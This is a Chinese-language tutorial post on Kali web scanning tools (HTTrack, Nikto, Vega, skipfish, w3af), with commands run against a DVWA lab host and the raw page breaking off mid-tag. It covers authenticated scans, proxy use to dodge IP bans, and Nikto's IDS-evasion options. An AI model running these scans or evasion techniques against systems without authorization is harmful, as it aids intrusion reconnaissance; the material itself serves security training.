      <url>/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="Httrack"><a href="#Httrack" class="headerlink" title="Httrack"></a>Httrack</h2><blockquote><p>web侦察工具；对目标网站进行复制克隆，将目标网站所有的页面都复制下来到本地；目的为了减少与目标服务器进行交互，防止侦察时被发现。</p></blockquote><ul><li>运行httrack<ul><li>Enter project name :输入项目名称</li><li>Base path (return&#x3D;&#x2F;root&#x2F;websites&#x2F;) :拷贝下来的目标网站页面的存储位置</li><li>Enter URLs (separated by commas or blank spaces) :输入访问网站的起始路径</li></ul></li></ul><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230127104425604.png" alt="image-20230127104425604"></p><blockquote><p>Action选项：</p><ol><li>直接镜像，镜像站点</li><li>使用向导完成镜像</li><li>只下载某些文件（xls、doc、pdf等）</li><li>镜像当前URL的所有链接</li><li>只测试当前URL下的所有链接</li></ol></blockquote><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230127104458778.png" alt="image-20230127104458778"></p><blockquote><ul><li><p>Proxy：使用代理选项，防止IP被封</p><ul><li><p>免费代理网站（小心使用）：</p><p><a href="https://www.sabaitechnology.com/hide-my-ass/">https://www.sabaitechnology.com/hide-my-ass/</a></p></li></ul></li><li><p>You can define wildcards, like: <code>-*.gif +www.*.com/*.zip -*img_*.zip</code></p><p>Wildcards (return&#x3D;none) :定义通配符，指定特定的包，例如：<code>-*.gif +www.*.com/*.zip -*img_*.zip</code>（*代表所有）</p></li><li><p>You can define additional options, such as recurse level (-r<number>), separated by blank spaces<br>To see the option list, type help<br>Additional options (return&#x3D;none) :定义额外的选项（-r<number>：递归多少层查询所有的页面）</number></number></p></li><li><p>Ready to launch the mirror? (Y&#x2F;n) :开始镜像</p></li></ul></blockquote><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230127105647578.png" alt="image-20230127105647578"></p><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230127105659289.png" alt="image-20230127105659289"></p><blockquote><p>以上就是从dvwa网站下载到本地的dvwa目录中；下载完之后每一个页面就可以搜索信息：泄露出的内网地址，应用程序架构，email信息等</p></blockquote><h2 id="扫描工具"><a href="#扫描工具" class="headerlink" title="扫描工具"></a>扫描工具</h2><blockquote><p>在Web层面的扫描工具，与通用型的扫描工具（nessus&#x2F;openvas）有所不同；</p><p><strong>基于Web的扫描工具大部分都支持两种扫描模式：1、代理截断模式；2、主动扫描模式</strong></p><p>手动扫描：自己将所有目标页面进行探测，所有的提交表单的部分，所有的各种功能，手动登录表单，手动点击每一个页面，发现那些参数可以注入等</p><p>自动扫描：可以辅助手动扫描（手动扫描看不到一些隐藏的内容）；但也不能过于依赖自动扫描</p></blockquote><h3 id="Nikto"><a href="#Nikto" class="headerlink" title="Nikto"></a>Nikto</h3><blockquote><p>纯主动扫描模式</p><ul><li>Perl语言开发的开源web安全扫描器</li><li>软件版本</li><li>搜索存在安全隐患的文件</li><li>服务器配置漏洞</li><li>WEB Application层面的安全隐患</li><li>避免404误判<ul><li>很多服务器不遵守RFC标准，对于不存在的对象返回200响应码</li><li>依据响应文件内容判断，不同扩展名的文件404响应内容不同</li><li>去除时间信息后的内容取MD5值</li><li>-no404参数：降低扫描准确度，不建议使用此参数</li></ul></li></ul></blockquote><ul><li><p>升级数据库及插件</p><ul><li>nikto -update</li></ul><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230127113404907.png" alt="image-20230127113404907"></p><blockquote><p>由于神奇的国度，需要挂外网才能升级数据库及插件</p></blockquote></li><li><p>各种类型插件</p><ul><li>nikto -list-plugins</li></ul><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230127113708084.png" alt="image-20230127113708084"></p></li><li><p>指定URL扫描</p><ul><li>nikto -host <a href="http://192.168.216.167/dvwa">http://192.168.216.167/dvwa</a></li></ul><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230127113926360.png" alt="image-20230127113926360"></p></li><li><p>指定端口扫描</p><ul><li>nikto 192.168.216.167 -port 80</li></ul><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230127114121150.png" alt="image-20230127114121150"></p></li><li><p>支持<code>SSL</code>扫描</p><ul><li>nikto -host &lt;域名&gt; -prot 443 -ssl</li></ul><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230127195037441.png" alt="image-20230127195037441"></p></li><li><p>使用nmap扫描IP段再交给nikto进行漏扫</p><ul><li><code>nmap -p80 192.168.216.0/24 -oG - | nikto -host -</code></li></ul><blockquote><p>-oG：扫描结果输出出来；第一个<code>-</code>：输出的结果；第二个<code>-</code>：nmap扫描出来开放80端口的IP</p></blockquote><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230127200954798.png" alt="image-20230127200954798"></p></li><li><p>使用代理</p><ul><li>nikto -host 192.168.216.167 -useproxy &lt;代理地址&gt;</li></ul></li><li><p>Nikto-interactive</p><blockquote><p>扫描过程当中用于交互的命令</p><p>Space – report current scan status  # 回车，报告当前扫描的状态</p><p>v – verbose mode on&#x2F;off    # 显示详细的信息</p><p>d – debug mode on&#x2F;off   #  debug信息，查看最详细的信息</p><p>e – error reporting on&#x2F;off   # 查看错误报告信息</p><p>p – progress reporting on&#x2F;off   # 扫描进度</p><p>r – redirect display on&#x2F;off        # 显示服务器发送给客户端的所有重定向</p><p>c – cookie display on&#x2F;off           # 显示服务器发送给客户端的所有cookie</p><p>a – auth display on&#x2F;off               # 显示身份认证过程</p><p>q – quit                               # 退出</p><p>N – next host                 # 扫描下一个主机</p><p>P - Pause                      # 暂停扫描</p></blockquote></li><li><p>设置配置文件</p><ul><li>修改UA头等信息进行伪装</li></ul><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230127204528762.png" alt="image-20230127204528762"></p><ul><li>设置cookie认证信息</li></ul><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230127204816546.png" alt="image-20230127204816546"></p><ul><li><p>躲避IDS技术</p><ul><li>-evasion</li></ul><blockquote><p>使用LibWhisker中对IDS的躲避技术，可使用以下几种类型：</p><ol><li>随机URL编码（非UTF-8方式）</li><li>自选择路径（&#x2F; .&#x2F;）</li><li>过早结束的URL</li><li>优先考虑长随机字符串</li><li>参数欺骗</li><li>使用TAB作为命令的分隔符</li><li>使用变化的URL</li><li>使用Windows路径分隔符<code>&quot;\&quot;</code></li></ol></blockquote></li></ul></li></ul><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230127205541469.png" alt="image-20230127205541469"></p><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230127205858917.png" alt="image-20230127205858917"></p><h3 id="Vega"><a href="#Vega" class="headerlink" title="Vega"></a>Vega</h3><blockquote><p>图形化工具，两种模式兼可</p><ul><li>JAVA编写的开源Web扫描器</li><li>扫描模式</li><li>代理模式</li><li>爬站、处理表单、注入测试</li><li>支持SSL：<a href="http://vega/ca.crt">http://vega/ca.crt</a></li></ul><p>新版本kali没有默认安装，需要手动安装</p><p>官网下载地址：<br><a href="https://subgraph.com/vega/download/index.en.html">https://subgraph.com/vega/download/index.en.html</a></p><p>安装参考文章：<br><a href="https://blog.csdn.net/weixin_56542574/article/details/124110420">https://blog.csdn.net/weixin_56542574/article/details/124110420</a></p></blockquote><h3 id="skipfish"><a href="#skipfish" class="headerlink" title="skipfish"></a>skipfish</h3><blockquote><ul><li>C语言编写</li><li>实验性的主动web安全评估工具</li><li>递归爬网</li><li>基于字典的探测</li><li>速度较快<ul><li>多路单线程，全异步网络I&#x2F;O，消除内存管理和调度开销</li><li>启发式自动内容识别</li></ul></li><li>误报较低</li></ul></blockquote><blockquote><p>扫描参数说明：</p><p>-I （i）：只检查包含’string’的URL   【适用于大型网站】</p><p>-X：不检查包含’string’的URL  【如：logout】</p><p>-K：不对指定参数进行Fuzz测试</p><p>-D：跨站点爬另一个域【即目标页面中有另一个域名，则进行扫描】</p><p>-l：每秒最大请求数</p><p>-m：每IP最大并发连接数【依据带宽】</p><p>–config：指定配置文件 【将参数命令写入一个配置文件】</p></blockquote><ul><li><p>使用skipfish必须要加<code>-o</code>参数</p><ul><li>skipfish -o test <a href="http://192.168.216.167/">http://192.168.216.167</a></li></ul><blockquote><p>-o：后面必须跟一个目录文件，将扫描报告存入此目录</p><p>test：指定的目录，不存在自动创建</p></blockquote><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230128103052792.png" alt="image-20230128103052792"></p><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230128103029228.png" alt="image-20230128103029228"></p></li></ul><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230128103230354.png" alt="image-20230128103230354"></p><blockquote><p>其中扫描结果生成的报告存放在<code>test/index.html</code>中</p></blockquote><ul><li><p><code>-I</code>指定扫描</p><ul><li>skipfish -o test1 -I &#x2F;dvwa&#x2F;  <a href="http://192.168.216.167/dvwa/">http://192.168.216.167/dvwa/</a></li></ul><p>字符串中包含<code>dvwa</code>字符串的才会扫描，不包含就不扫描</p><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230128104201849.png" alt="image-20230128104201849"></p></li><li><p>使用<code>.txt</code>文件进行批量扫描</p><ul><li><p>skipfish -o test @url.txt</p><blockquote><p>url.txt：存放地址的文本文件</p></blockquote></li></ul></li><li><p>指定内置字典扫描隐藏内容</p><ul><li><p>字典存放路径</p><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230128105341448.png" alt="image-20230128105341448"></p></li><li><p>skipfish -o test -S &#x2F;usr&#x2F;share&#x2F;skipfish&#x2F;dictionaries&#x2F;minimal.wl <a href="http://192.168.216.167/dvwa/">http://192.168.216.167/dvwa/</a></p></li></ul><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230128105928722.png" alt="image-20230128105928722"></p><ul><li><p>指定特定内容</p><blockquote><p>爬站时候发现此网站一些特有的目录内容和特征字符，可以将特征字符存下来通过<code>-W</code>，指定空文件<code>a.wl</code>再将特有的目录内容和特征字符写入其中进行扫描</p></blockquote><ul><li>skipfish -o test -S complet.wl -W a.wl <a href="http://1.1.1.1/">http://1.1.1.1</a></li></ul></li></ul></li><li><p>跨站扫描</p><blockquote><p>-D参数：当扫描当前站点时，若此目标网站有连接到新的站点的话，会直接跳到新的站点进行扫描</p></blockquote><ul><li><code>skipfish -o test3 -D www.w3.org -I /dvwa/ -S /usr/share/skipfish/dictionaries/minimal.wl http://192.168.216.167/dvwa/</code></li></ul><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230128111316196.png" alt="image-20230128111316196"></p></li><li><p>指定每秒最大扫描数</p><ul><li><code>skipfish -o test3 -l 20 -I /dvwa/ -S /usr/share/skipfish/dictionaries/minimal.wl http://192.168.216.167/dvwa/</code></li></ul><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230128111520237.png" alt="image-20230128111520237"></p></li><li><p>每个IP的并发连接数（影响）</p><ul><li><code>skipfish -o test3  -m 10 -I /dvwa/ -S /usr/share/skipfish/dictionaries/minimal.wl http://192.168.216.167/dvwa/</code></li></ul><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230128111837392.png" alt="image-20230128111837392"></p></li></ul><h4 id="skipfish身份认证"><a href="#skipfish身份认证" class="headerlink" title="skipfish身份认证"></a>skipfish身份认证</h4><ul><li><p>基本身份认证</p><ul><li>skipfish -A user:pass -o test <a href="http://1.1.1.1/">http://1.1.1.1</a></li></ul></li><li><p>Cookie身份认证</p><ul><li><p>skipfish -C “name&#x3D;val” -o test <a href="http://1.1.1.1/">http://1.1.1.1</a></p></li><li><p>找到cookie信息</p></li></ul><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230128112941554.png" alt="image-20230128112941554"></p><ul><li><p>构造命令</p><ul><li><code>skipfish -o test -C &quot;PHPSESSID=42c5a86191d270eea8ccc77eea52f9c6&quot; -C &quot;security=low&quot; -I dvwa http://192.168.216.167/dvwa/</code></li></ul><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230128113329382.png" alt="image-20230128113329382"></p></li><li><p>按回车显示详细信息</p><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230128113411151.png" alt="image-20230128113411151"></p><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230128113422114.png" alt="image-20230128113422114"></p><blockquote><p>使用登录的方式进行扫描</p></blockquote></li></ul></li><li><p>直接提交表单的方式将身份认证信息提交给web</p><blockquote><p>有些web使用cookie无法进行身份认证就要直接提交表单</p></blockquote><ul><li><p>man skipfish</p><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230128113906925.png" alt="image-20230128113906925"></p><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230128113915619.png" alt="image-20230128113915619"></p><blockquote><p>–auth-form <URL>：提交表单的来源</URL></p><p>–auth-form-target：指定表单目标</p><p>–auth-user-filed：指定用户名表单名</p><p>–auth-pass-filed：指定密码表单名</p><p>–auth-user <username>：提交用户名</username></p><p>–auth-pass <password>：提交密码</password></p><p>–auth-verify-url <URL>：验证URL地址</URL></p></blockquote></li><li><p><code>skipfish -o test1 --auth-form http://192.168.216.167/dvwa/login.php --auth-form-target http://192.168.216.167/dvwa/login.php --auth-user-field username --auth-user admin --auth-pass-field password --auth-pass password --auth-verify-url http://192.168.216.167/dvwa/index.php -I /dvwa/ -X logout.php http://192.168.216.167/dvwa/</code></p></li></ul><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230128115931514.png" alt="image-20230128115931514"></p><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230128115906626.png" alt="image-20230128115906626"></p></li></ul><h3 id="w3af"><a href="#w3af" class="headerlink" title="w3af"></a>w3af</h3><blockquote><ul><li>Web Application Attack and Audit Framework҅，基于python语言开发</li><li>此框架的目标是帮助你<strong>发现</strong>和<strong>利用</strong>所有WEB应用程序漏洞</li><li>9大类近150个plugin<ul><li>audit                               # 审计</li><li>infrastructure               # 基础架构 </li><li>grep                               # 被动扫描</li><li>evasion                         # 逃避IPS&#x2F;WAF&#x2F;IDS等</li><li>mangle                         # 基于正则表达式的内容的替换 </li><li>auth                              # 身份认证</li><li>bruteforce                   # 暴力破解</li><li>output                          # 扫描出的结果输出格式（xml，txt等）</li><li>crawl                             # 爬网</li><li><strong>attack</strong>                          # 攻击模式（不可修改，固定攻击模式）</li></ul></li></ul></blockquote><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><ul><li><p>切换python版本</p><ul><li>update-alternatives –install &#x2F;usr&#x2F;bin&#x2F;python python &#x2F;usr&#x2F;bin&#x2F;python2 100</li><li>update-alternatives –install &#x2F;usr&#x2F;bin&#x2F;python python &#x2F;usr&#x2F;bin&#x2F;python3 150</li><li>切换版本号<ul><li>update-alternatives –config python</li></ul></li></ul><blockquote><p>100和150用于优先级（150&gt;100）</p><p>update-alternatives命令：其作用是进行软件版本的切换，Linux发行版中均可用此命令</p></blockquote></li></ul><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230128222250720.png" alt="image-20230128222250720"></p><ul><li><p>安装docker</p><ul><li><a href="https://blog.csdn.net/qq_41832837/article/details/103948314">https://blog.csdn.net/qq_41832837/article/details/103948314</a></li></ul><pre class="line-numbers language-none"><code class="language-none">curl -fsSL https:&#x2F;&#x2F;download.docker.com&#x2F;linux&#x2F;debian&#x2F;gpg | sudo apt-key add -echo &#39;deb https:&#x2F;&#x2F;download.docker.com&#x2F;linux&#x2F;debian stretch stable&#39;&gt; &#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;docker.listapt-get install apt-transport-https  ca-certificates  curl  gnupg2  software-properties-commonapt-get updateapt install docker.iodocker   # 用于检查docker是否正常安装<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>docker下载 w3af 镜像</p><ul><li><code>docker pull andresriancho/w3af</code></li></ul></li><li><p>git下载 w3af 软件包</p><ul><li><code>git clone https://github.com/andresriancho/w3af.git</code></li></ul></li><li><p>运行脚本</p><pre class="line-numbers language-none"><code class="language-none">cd w3af&#x2F;extras&#x2F;docker&#x2F;scripts&#x2F;.&#x2F;w3af_console_docker<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>运行上面脚本之前切换到python2，否则会报错</p><ul><li>password为<code>w3af</code></li><li>输入<code>y</code>接受免责协议</li></ul><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230128222507244.png" alt="image-20230128222507244"></p><blockquote><p>以上安装的是w3af命令行模式</p></blockquote></li></ul><h4 id="w3af使用"><a href="#w3af使用" class="headerlink" title="w3af使用"></a>w3af使用</h4><h5 id="升级"><a href="#升级" class="headerlink" title="升级"></a>升级</h5><ul><li>git pull       # 在w3af目录下执行</li></ul><blockquote><p><strong>w3af基本描述</strong></p><p>start：开始扫描</p><p>plugins：插件模块</p><p>exploit：攻击模块</p><p>profiles：列出并使用扫描配置文件</p><ul><li><p>W3af_console</p><ul><li>help                                           # 显示可用指令</li><li>plugin                                        # 进入plugin子命令<ul><li>Help                                    # 显示可用指令</li><li>list audit                             # 列出audit类所有插件</li><li>audit sqli xss                     # 选择使用audit类插件</li></ul></li></ul></li><li><p>http-settings &#x2F; misc-settings         # 全局配置 </p><ul><li>help</li><li>view                                           # 查看可配置的参数</li><li>set                                              # 设置参数</li><li>back                                           # 回到上一级命令</li></ul></li></ul></blockquote><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230128224518293.png" alt="image-20230128224518293"></p><h5 id="插件类型"><a href="#插件类型" class="headerlink" title="插件类型"></a>插件类型</h5><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230128225546610.png" alt="image-20230128225546610"></p><h5 id="列出具体的插件"><a href="#列出具体的插件" class="headerlink" title="列出具体的插件"></a>列出具体的插件</h5><h5 id><a href="#" class="headerlink" title></a><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230128225644740.png" alt="image-20230128225644740"></h5><h5 id="选择扫描插件"><a href="#选择扫描插件" class="headerlink" title="选择扫描插件"></a>选择扫描插件</h5><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230128225941318.png" alt="image-20230128225941318"></p><h5 id="自定义扫描配置文件"><a href="#自定义扫描配置文件" class="headerlink" title="自定义扫描配置文件"></a>自定义扫描配置文件</h5><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230128230317170.png" alt="image-20230128230317170"></p><ul><li><p>Profiles</p><ul><li>save_as self-contained</li><li>save_as test self-contained   # 完全独立存在的配置文件（包含字典文件，外部引用的文件，可拷贝给其他人使用）</li></ul></li><li><p>Target</p><p>• set target <a href="http://1.1.1.1/">http://1.1.1.1/</a>  # 设置扫描目标</p></li><li><p>Start   # 开启扫描</p></li><li><p>Script</p><ul><li><p>script&#x2F;*.w3af</p></li><li><p>默认脚本路径</p><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230128232456003.png" alt="image-20230128232456003"></p><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230128232622543.png" alt="image-20230128232622543"></p><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230128232600669.png" alt="image-20230128232600669"></p><blockquote><p>可将经常使用的命令集成到脚本中，扫描时调用脚本即可</p></blockquote></li></ul></li></ul><h4 id="w3af—身份认证"><a href="#w3af—身份认证" class="headerlink" title="w3af—身份认证"></a>w3af—身份认证</h4><blockquote><ul><li>HTTP Basic                  # HTTP基本身份认证</li><li>NTLM                           # 基于NTLM的身份认证</li><li>Form                            # 基于表单的身份认证</li><li>Cookie                         # 双因素身份认证&#x2F;anti-CSRF tokens</li></ul></blockquote><h5 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h5><blockquote><p>使windows XP提供HTTP基本身份认证和NTLM身份认证</p></blockquote><ul><li><p>打开”添加或删除应用程序“安装IIS</p><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230129100207167.png" alt="image-20230129100207167"></p></li></ul><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230129100422981.png" alt="image-20230129100422981"></p><ul><li>”开始“—&gt;”管理工具“—&gt;“IIS”—&gt;打开”默认网站“—&gt;右键“属性”—&gt;”目录安全性“</li></ul><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230129100924857.png" alt="image-20230129100924857"></p><ul><li>勾选基本身份认证</li></ul><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230129101206469.png" alt="image-20230129101206469"></p><ul><li>此时在kali中访问站点需要身份认证</li></ul><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230129101439546.png" alt="image-20230129101439546"></p><p><img src="/2023/01/27/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-Web%E6%B8%97%E9%80%8F%E3%80%90%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%E3%80%91/image-20230129101532276.png" alt="image-20230129101532276"></p><ul><li>打开抓包工具只抓取192.168.216.172的包</li></ul><p><img 